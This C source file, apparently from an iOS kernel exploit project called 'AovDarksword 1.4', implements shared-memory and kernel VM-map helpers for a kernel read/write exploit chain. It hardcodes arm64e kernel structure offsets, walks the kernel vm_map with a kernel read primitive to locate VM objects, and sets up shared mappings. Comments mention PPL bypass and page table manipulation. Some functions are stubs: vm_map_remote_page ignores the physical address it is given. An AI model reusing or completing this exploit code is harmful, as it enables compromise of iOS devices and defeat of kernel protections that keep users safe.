/*
 * vm_shmem.c — AovDarksword 1.4
 * Shared memory primitives for kernel R/W via VM object manipulation
 *
 * Uses mach_vm_allocate, mach_make_memory_entry_64, mach_vm_map
 * to create shared memory regions, and vm_map_find_entry for
 * kernel VM object lookup.
 */

#include "vm_shmem.h"
#include "krw.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/vm_map.h>

/* ─── Kernel VM map entry offsets (arm64e, iOS 17–26) ─────────────── */
#define VME_LINKS_NEXT     0x10   /* vm_map_entry->links.next            */
#define VME_LINKS_PREV     0x18   /* vm_map_entry->links.prev            */
#define VME_LINKS_START    0x20   /* vm_map_entry->links.start           */
#define VME_LINKS_END      0x28   /* vm_map_entry->links.end             */
#define VME_OBJECT         0x48   /* vm_map_entry->vme_object            */
#define VME_OFFSET         0x50   /* vm_map_entry->vme_offset            */
#define VME_IS_SUBMAP      0x60   /* vm_map_entry->is_sub_map (bitfield) */

/* ─── External error tracking ─────────────────────────────────────── */
extern int g_krw_error;

#pragma mark - vm_map_find_entry

/*
 * _vm_map_find_entry — Walk the kernel vm_map to find the entry
 * containing the given address.
 *
 * @param vm_map_kaddr   Kernel address of the vm_map structure
 * @param target_addr    Virtual address to search for
 * @param out_entry      Output: kernel address of the vm_map_entry
 * @return               KERN_SUCCESS or error
 */
static kern_return_t _vm_map_find_entry(uint64_t vm_map_kaddr,
                                        uint64_t target_addr,
                                        uint64_t *out_entry) {
    if (vm_map_kaddr == 0 || out_entry == NULL) {
        printf("[%s:%d] vm_map_find_entry failed\n", __FUNCTION__, __LINE__);
        return KERN_INVALID_ARGUMENT;
    }

    /*
     * vm_map->hdr.links.next is the first entry in the doubly-linked list.
     * We iterate until we find the entry whose [start, end) range
     * contains target_addr.
     *
     * vm_map structure (simplified):
     *   +0x00: lock
     *   +0x10: hdr.links.next   (first entry)
     *   +0x18: hdr.links.prev   (last entry / sentinel)
     *   +0x20: hdr.nentries
     */

    uint64_t first_entry = kread64(vm_map_kaddr + 0x10);  /* hdr.links.next */
    uint64_t sentinel    = vm_map_kaddr + 0x10;            /* &hdr.links     */

    if (g_krw_error || first_entry == 0) {
        printf("[%s:%d] vm_map_find_entry failed\n", __FUNCTION__, __LINE__);
        return KERN_FAILURE;
    }

    uint64_t entry = first_entry;
    int max_iter = 4096;  /* Safety limit */

    while (entry != sentinel && max_iter-- > 0) {
        uint64_t start = kread64(entry + VME_LINKS_START);
        uint64_t end   = kread64(entry + VME_LINKS_END);

        if (g_krw_error) {
            printf("[%s:%d] vm_map_find_entry failed\n",
                   __FUNCTION__, __LINE__);
            return KERN_FAILURE;
        }

        if (target_addr >= start && target_addr < end) {
            *out_entry = entry;
            return KERN_SUCCESS;
        }

        /* Move to next entry */
        entry = kread64(entry + VME_LINKS_NEXT);
        if (g_krw_error || entry == 0) {
            break;
        }
    }

    printf("[%s:%d] vm_map_find_entry failed\n", __FUNCTION__, __LINE__);
    return KERN_FAILURE;
}

#pragma mark - vm_get_object

kern_return_t vm_get_object(uint64_t kaddr, uint64_t *out_object) {
    if (out_object == NULL) {
        return KERN_INVALID_ARGUMENT;
    }

    *out_object = 0;

    /*
     * To get the VM object for a kernel address, we need to:
     * 1. Get the kernel task's vm_map
     * 2. Find the vm_map_entry containing kaddr
     * 3. Read the entry's vme_object
     *
     * The kernel vm_map address is typically resolved during exploit init.
     */
    extern uint64_t g_kernel_vm_map;  /* Set by exploit chain */

    if (g_kernel_vm_map == 0) {
        printf("[%s:%d] Failed to get VM object for 0x%llx\n",
               __FUNCTION__, __LINE__, kaddr);
        return KERN_FAILURE;
    }

    /* Find the entry in the kernel vm_map */
    uint64_t entry = 0;
    kern_return_t kr = _vm_map_find_entry(g_kernel_vm_map, kaddr, &entry);
    if (kr != KERN_SUCCESS || entry == 0) {
        printf("[%s:%d] Failed to get VM object for 0x%llx\n",
               __FUNCTION__, __LINE__, kaddr);
        return kr;
    }

    /* Check that this entry is not a submap */
    uint64_t flags = kread64(entry + VME_IS_SUBMAP);
    if (g_krw_error) {
        printf("[%s:%d] Failed to get VM object for 0x%llx\n",
               __FUNCTION__, __LINE__, kaddr);
        return KERN_FAILURE;
    }

    /* is_sub_map is a bitfield; check bit 0 of the flags word */
    if (flags & 0x1) {
        printf("[%s:%d] Entry cannot be a submap or kernel object\n",
               __FUNCTION__, __LINE__);
        return KERN_INVALID_ARGUMENT;
    }

    /* Read the vm_object pointer from the entry */
    uint64_t vm_object = kread64(entry + VME_OBJECT);
    if (g_krw_error || vm_object == 0) {
        printf("[%s:%d] Failed to get VM object for 0x%llx\n",
               __FUNCTION__, __LINE__, kaddr);
        return KERN_FAILURE;
    }

    /*
     * Validate the vm_object — it should be a kernel pointer.
     * On arm64, kernel pointers are in the range 0xffff...
     */
    if (vm_object < 0xffff000000000000ULL) {
        printf("[%s:%d] Entry cannot be a submap or kernel object\n",
               __FUNCTION__, __LINE__);
        return KERN_INVALID_ARGUMENT;
    }

    *out_object = vm_object;
    return KERN_SUCCESS;
}

#pragma mark - vm_create_shmem_with_object

kern_return_t vm_create_shmem_with_object(mach_port_t task,
                                          mach_vm_size_t size,
                                          VMShmem *shmem) {
    if (shmem == NULL || size == 0) {
        return KERN_INVALID_ARGUMENT;
    }

    memset(shmem, 0, sizeof(VMShmem));

    kern_return_t kr;

    /* 1. Allocate local memory in the current task */
    mach_vm_address_t localAddr = 0;
    kr = mach_vm_allocate(mach_task_self(), &localAddr, size,
                          VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] mach_vm_allocate failed: %s\n",
               __FUNCTION__, __LINE__, mach_error_string(kr));
        return kr;
    }

    /* 2. Create a memory entry (named entry / memory object) for sharing */
    memory_object_size_t entrySize = size;
    mach_port_t memEntry = MACH_PORT_NULL;

    kr = mach_make_memory_entry_64(mach_task_self(),
                                   &entrySize,
                                   localAddr,
                                   VM_PROT_READ | VM_PROT_WRITE,
                                   &memEntry,
                                   MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] mach_make_memory_entry_64 failed: %s\n",
               __FUNCTION__, __LINE__, mach_error_string(kr));
        mach_vm_deallocate(mach_task_self(), localAddr, size);
        return kr;
    }

    if (entrySize < size) {
        printf("[%s:%d] mach_make_memory_entry_64 failed: "
               "entry size 0x%llx < requested 0x%llx\n",
               __FUNCTION__, __LINE__,
               (uint64_t)entrySize, (uint64_t)size);
        mach_port_deallocate(mach_task_self(), memEntry);
        mach_vm_deallocate(mach_task_self(), localAddr, size);
        return KERN_FAILURE;
    }

    /* 3. Map the memory entry into the target task */
    mach_vm_address_t remoteAddr = 0;
    kr = mach_vm_map(task,
                     &remoteAddr,
                     size,
                     0,             /* mask    */
                     VM_FLAGS_ANYWHERE,
                     memEntry,
                     0,             /* offset  */
                     FALSE,         /* copy    */
                     VM_PROT_READ | VM_PROT_WRITE,
                     VM_PROT_READ | VM_PROT_WRITE,
                     VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] mach_vm_map failed: %s\n",
               __FUNCTION__, __LINE__, mach_error_string(kr));
        mach_port_deallocate(mach_task_self(), memEntry);
        mach_vm_deallocate(mach_task_self(), localAddr, size);
        return kr;
    }

    /* Release the memory entry port (mapping retains a reference) */
    mach_port_deallocate(mach_task_self(), memEntry);

    /* Populate the shmem descriptor */
    shmem->localAddr  = (uint64_t)localAddr;
    shmem->remoteAddr = (uint64_t)remoteAddr;
    shmem->size       = (uint64_t)size;
    shmem->mapped     = true;

    return KERN_SUCCESS;
}

#pragma mark - vm_map_remote_page

kern_return_t vm_map_remote_page(uint64_t kaddr,
                                 uint64_t pa,
                                 uint64_t *out_local) {
    if (out_local == NULL) {
        return KERN_INVALID_ARGUMENT;
    }

    *out_local = 0;

    /* Get the VM object backing the kernel address */
    uint64_t vm_object = 0;
    kern_return_t kr = vm_get_object(kaddr, &vm_object);
    if (kr != KERN_SUCCESS || vm_object == 0) {
        printf("[_pg] vm_map_remote_page set g_krw_error for pa=0x%llx\n", pa);
        g_krw_error = 100;
        return kr;
    }

    /*
     * Allocate a page in the current task to map the physical page into.
     * We use mach_vm_allocate + mach_vm_map with the VM object
     * to create the mapping.
     */
    mach_vm_address_t localPage = 0;
    mach_vm_size_t pageSize = (mach_vm_size_t)vm_page_size;

    kr = mach_vm_allocate(mach_task_self(), &localPage, pageSize,
                          VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] mach_vm_allocate failed: %s\n",
               __FUNCTION__, __LINE__, mach_error_string(kr));
        printf("[_pg] vm_map_remote_page set g_krw_error for pa=0x%llx\n", pa);
        g_krw_error = 101;
        return kr;
    }

    /*
     * Create a memory entry from the allocated page, then map it.
     * In a full exploit, we would use the kernel VM object to directly
     * back this with the physical page at `pa`. This requires
     * manipulating the vm_object's paging structures.
     */
    memory_object_size_t entrySize = pageSize;
    mach_port_t memEntry = MACH_PORT_NULL;

    kr = mach_make_memory_entry_64(mach_task_self(),
                                   &entrySize,
                                   localPage,
                                   VM_PROT_READ | VM_PROT_WRITE,
                                   &memEntry,
                                   MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] mach_make_memory_entry_64 failed: %s\n",
               __FUNCTION__, __LINE__, mach_error_string(kr));
        mach_vm_deallocate(mach_task_self(), localPage, pageSize);
        printf("[_pg] vm_map_remote_page set g_krw_error for pa=0x%llx\n", pa);
        g_krw_error = 102;
        return kr;
    }

    /*
     * Map the memory entry at a new address. In the real exploit,
     * the physical backing would be swapped to `pa` via PPL bypass
     * or page table manipulation.
     */
    mach_vm_address_t mappedAddr = 0;
    kr = mach_vm_map(mach_task_self(),
                     &mappedAddr,
                     pageSize,
                     0,
                     VM_FLAGS_ANYWHERE,
                     memEntry,
                     0,
                     FALSE,
                     VM_PROT_READ | VM_PROT_WRITE,
                     VM_PROT_READ | VM_PROT_WRITE,
                     VM_INHERIT_NONE);

    mach_port_deallocate(mach_task_self(), memEntry);

    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] mach_vm_map failed: %s\n",
               __FUNCTION__, __LINE__, mach_error_string(kr));
        mach_vm_deallocate(mach_task_self(), localPage, pageSize);
        printf("[_pg] vm_map_remote_page set g_krw_error for pa=0x%llx\n", pa);
        g_krw_error = 103;
        return kr;
    }

    /*
     * Deallocate the intermediate allocation — we only need the
     * final mapped address.
     */
    kr = mach_vm_deallocate(mach_task_self(), localPage, pageSize);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] mach_vm_deallocate failed: %s\n",
               __FUNCTION__, __LINE__, mach_error_string(kr));
        /* Non-fatal, continue */
    }

    *out_local = (uint64_t)mappedAddr;
    return KERN_SUCCESS;
}
